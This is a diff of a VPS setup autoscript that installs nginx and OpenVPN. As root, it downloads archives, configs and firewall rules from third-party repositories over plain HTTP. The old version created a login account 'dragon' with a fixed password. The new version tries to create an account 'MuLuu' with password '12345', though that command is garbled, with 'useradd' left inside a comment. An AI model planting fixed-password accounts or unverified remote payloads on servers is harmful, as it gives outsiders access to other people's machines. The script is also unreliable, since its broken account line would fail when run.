@@ -161,26 +161,31 @@ mkdir -p /home/vps/public_html
 echo "<pre>SETUP BY ARA PM +601126996292</pre>" > /home/vps/public_html/index.html
 wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/ara-rangers/vps/master/vps.conf"
 
-# openvpn
-apt-get -y install openvpn
+# install openvpn
+wget -O /etc/openvpn/openvpn.tar "http://raw.github.com/Qeesya/autoscript/master/script/openvpn.tar"
 cd /etc/openvpn/
-wget https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
-wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/iptables.up.rules"
+tar xf openvpn.tar
+wget -O /etc/openvpn/1194.conf "http://raw.github.com/Qeesya/autoscript/master/script/1194.conf"
+service openvpn restart
+sysctl -w net.ipv4.ip_forward=1
+sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
+wget -O /etc/iptables.up.rules "http://raw.github.com/MuLuu09/conf/master/iptables.up.rules"
 sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
-sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+MYIP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | grep -v '192.168'`;
+MYIP2="s/xxxxxxxxx/$MYIP/g";
+sed -i 's/port 1194/port 6500/g' /etc/openvpn/1194.conf
+sed -i $MYIP2 /etc/iptables.up.rules;
 iptables-restore < /etc/iptables.up.rules
+service openvpn restart
+
 # etc
-wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/client.ovpn"
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
-cd;wget https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/cronjob.tar
-tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
-mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
-chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
-useradd -m -g users -s /bin/bash dragon
-echo "dragon:369" | chpasswd
-echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
-rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
-clear
+wget -O /home/vps/public_html/client.ovpn "http://raw.github.com/Qeesya/autoscript/master/script/client.ovpn"
+sed -i $MYIP2 /home/vps/public_html/client.ovpn;
+cd
+#add useruseradd 
+-m -g users -s /bin/bash MuLuu
+echo "MuLuu:12345" | chpasswd
+
 
 
 
